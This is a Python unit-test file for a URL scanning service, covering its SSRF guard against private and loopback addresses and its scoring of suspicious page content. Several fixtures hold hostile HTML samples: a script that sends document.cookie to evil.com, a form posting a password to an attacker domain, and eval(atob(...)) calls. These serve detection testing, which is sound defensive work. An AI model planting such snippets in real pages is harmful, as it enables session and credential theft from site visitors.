"""
Unit tests — app.services.url_scan_service
Covers: _validate_url, _analyze_url (mocked httpx), verdict/scoring logic,
        SSL error path, SSRF guard, threat type classification.
"""

import pytest
import httpx
from unittest.mock import AsyncMock, MagicMock, patch

from app.services.url_scan_service import _validate_url, _analyze_url


# ── Helpers ──────────────────────────────────────────────────────────────────

def _mock_client(final_url: str, html: str, history_urls: list[str] | None = None):
    """Return a patched httpx.AsyncClient that yields a fake response."""
    history = []
    for h_url in (history_urls or []):
        h = MagicMock()
        h.url = httpx.URL(h_url)
        history.append(h)

    resp = MagicMock()
    resp.url = httpx.URL(final_url)
    resp.history = history
    resp.text = html

    mock_client = AsyncMock()
    mock_client.get = AsyncMock(return_value=resp)

    ctx = MagicMock()
    ctx.__aenter__ = AsyncMock(return_value=mock_client)
    ctx.__aexit__ = AsyncMock(return_value=False)
    return ctx


# ── _validate_url ─────────────────────────────────────────────────────────────

class TestValidateUrl:
    def test_https_ok(self):
        _validate_url("https://example.com")  # must not raise

    def test_http_ok(self):
        _validate_url("http://example.com")

    def test_ftp_rejected(self):
        with pytest.raises(ValueError, match="http"):
            _validate_url("ftp://example.com")

    def test_no_scheme_rejected(self):
        with pytest.raises(ValueError):
            _validate_url("example.com")

    def test_localhost_rejected(self):
        with pytest.raises(ValueError, match="internal"):
            _validate_url("http://localhost/admin")

    def test_127_0_0_1_rejected(self):
        with pytest.raises(ValueError, match="internal"):
            _validate_url("http://127.0.0.1")

    def test_private_10_rejected(self):
        with pytest.raises(ValueError, match="private"):
            _validate_url("http://10.0.0.1")

    def test_private_192168_rejected(self):
        with pytest.raises(ValueError, match="private"):
            _validate_url("http://192.168.1.100")

    def test_private_172_16_rejected(self):
        with pytest.raises(ValueError, match="private"):
            _validate_url("http://172.16.0.1")

    def test_private_172_31_rejected(self):
        with pytest.raises(ValueError, match="private"):
            _validate_url("http://172.31.255.255")

    def test_public_172_outside_range_ok(self):
        # 172.15.x.x is public
        _validate_url("http://172.15.0.1")

    def test_loopback_ipv6_rejected(self):
        # IPv6 in URLs requires bracket notation: http://[::1]
        with pytest.raises(ValueError):
            _validate_url("http://[::1]")


# ── _analyze_url ─────────────────────────────────────────────────────────────

class TestAnalyzeUrl:

    @pytest.mark.asyncio
    async def test_clean_page_is_safe(self):
        ctx = _mock_client("https://example.com", "<html><body><p>Hello world</p></body></html>")
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        assert result["verdict"] == "safe"
        assert result["threat_score"] < 31
        assert result["findings"] == []

    @pytest.mark.asyncio
    async def test_eval_detected(self):
        html = "<script>eval(atob('aGVsbG8='));</script>"
        ctx = _mock_client("https://example.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "js_eval" in types

    @pytest.mark.asyncio
    async def test_document_cookie_detected(self):
        html = "<script>var c = document.cookie; fetch('//evil.com?c='+c);</script>"
        ctx = _mock_client("https://example.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "cookie_access" in types

    @pytest.mark.asyncio
    async def test_external_form_phishing(self):
        html = '<form action="https://evil-collector.ru/steal" method="POST"><input name="password"></form>'
        ctx = _mock_client("https://legitimate-bank.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://legitimate-bank.com")
        types = [f["type"] for f in result["findings"]]
        assert "external_form" in types
        assert result["threat_score"] >= 30
        assert result["threat_type"] == "phishing"

    @pytest.mark.asyncio
    async def test_external_iframe_detected(self):
        html = '<iframe src="https://tracker.ad.net/pixel"></iframe>'
        ctx = _mock_client("https://example.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "external_iframe" in types

    @pytest.mark.asyncio
    async def test_meta_refresh_detected(self):
        html = '<meta http-equiv="refresh" content="0;url=https://redirect.com">'
        ctx = _mock_client("https://example.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "meta_refresh" in types

    @pytest.mark.asyncio
    async def test_domain_redirect_detected(self):
        ctx = _mock_client(
            final_url="https://different-domain.com/page",
            html="<html></html>",
            history_urls=["https://original.com"],
        )
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://original.com")
        types = [f["type"] for f in result["findings"]]
        assert "domain_redirect" in types
        assert result["redirect_count"] == 1

    @pytest.mark.asyncio
    async def test_multiple_redirects_detected(self):
        ctx = _mock_client(
            final_url="https://example.com/end",
            html="<html></html>",
            history_urls=["https://example.com/1", "https://example.com/2", "https://example.com/3"],
        )
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "multiple_redirects" in types

    @pytest.mark.asyncio
    async def test_suspicious_tld_ru(self):
        ctx = _mock_client("https://malware.ru", "<html></html>")
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://malware.ru")
        types = [f["type"] for f in result["findings"]]
        assert "suspicious_tld" in types

    @pytest.mark.asyncio
    async def test_ssl_error_recorded(self):
        # httpx raises ConnectError (not SSLError) for SSL failures in v0.28+
        ssl_ctx = MagicMock()
        ssl_ctx.__aenter__ = AsyncMock(
            side_effect=httpx.ConnectError("SSL certificate verify failed")
        )
        ssl_ctx.__aexit__ = AsyncMock(return_value=False)

        # Second call (verify=False retry) succeeds
        ok_ctx = _mock_client("https://bad-cert.com", "<html></html>")

        call_count = 0
        def side_effect(**kwargs):
            nonlocal call_count
            call_count += 1
            return ssl_ctx if call_count == 1 else ok_ctx

        with patch("app.services.url_scan_service.httpx.AsyncClient", side_effect=side_effect):
            result = await _analyze_url("https://bad-cert.com")

        types = [f["type"] for f in result["findings"]]
        assert "ssl_error" in types
        assert result["ssl_valid"] is False
        assert result["threat_score"] >= 20

    @pytest.mark.asyncio
    async def test_timeout_raises_value_error(self):
        ctx = MagicMock()
        ctx.__aenter__ = AsyncMock(side_effect=httpx.TimeoutException("timeout"))
        ctx.__aexit__ = AsyncMock(return_value=False)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            with pytest.raises(ValueError, match="timeout"):
                await _analyze_url("https://slow-site.com")

    @pytest.mark.asyncio
    async def test_request_error_raises_value_error(self):
        ctx = MagicMock()
        ctx.__aenter__ = AsyncMock(side_effect=httpx.RequestError("conn refused"))
        ctx.__aexit__ = AsyncMock(return_value=False)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            with pytest.raises(ValueError, match="réseau"):
                await _analyze_url("https://unreachable.com")

    @pytest.mark.asyncio
    async def test_score_capped_at_100(self):
        """All detections firing simultaneously must not exceed 100."""
        html = """
        <script>eval(atob('x'));</script>
        <script>document.cookie='a';</script>
        <script>window.location='https://evil.com';</script>
        <form action="https://evil.com/steal"></form>
        <iframe src="https://tracker.io/px"></iframe>
        <meta http-equiv="refresh" content="0">
        """
        ctx = _mock_client(
            final_url="https://phishing.tk/page",
            html=html,
            history_urls=["https://original.com", "https://step2.ru", "https://step3.cn"],
        )
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://original.com")
        assert result["threat_score"] <= 100

    @pytest.mark.asyncio
    async def test_verdict_safe_boundary(self):
        """Score 0 → safe."""
        ctx = _mock_client("https://example.com", "<html><p>Clean page</p></html>")
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        assert result["verdict"] == "safe"

    @pytest.mark.asyncio
    async def test_verdict_malicious_threshold(self):
        """External form alone (+30) + eval (+15) + cookie (+15) + meta (+15) = 75 → malicious."""
        html = """
        <script>eval('x');</script>
        <script>document.cookie;</script>
        <form action="https://stealer.ru/get"></form>
        <meta http-equiv="refresh" content="0">
        """
        ctx = _mock_client("https://victim.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://victim.com")
        assert result["verdict"] == "malicious"
        assert result["threat_score"] >= 66

    @pytest.mark.asyncio
    async def test_js_redirect_detected(self):
        html = "<script>window.location = 'https://evil.com';</script>"
        ctx = _mock_client("https://example.com", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://example.com")
        types = [f["type"] for f in result["findings"]]
        assert "js_redirect" in types
        assert result["threat_type"] == "malware"

    @pytest.mark.asyncio
    async def test_redirect_chain_capped_at_10(self):
        """redirect_chain in result must not exceed 10 entries."""
        ctx = _mock_client(
            final_url="https://end.com",
            html="<html></html>",
            history_urls=[f"https://hop{i}.com" for i in range(15)],
        )
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://start.com")
        assert len(result["redirect_chain"]) <= 10

    @pytest.mark.asyncio
    async def test_phishing_keyword_on_different_domain(self):
        html = "<html><body><p>Log in to your paypal account below</p></body></html>"
        ctx = _mock_client("https://totally-not-paypal.xyz", html)
        with patch("app.services.url_scan_service.httpx.AsyncClient", return_value=ctx):
            result = await _analyze_url("https://totally-not-paypal.xyz")
        types = [f["type"] for f in result["findings"]]
        # suspicious_tld (.xyz) + phishing_keyword
        assert "suspicious_tld" in types or "phishing_keyword" in types
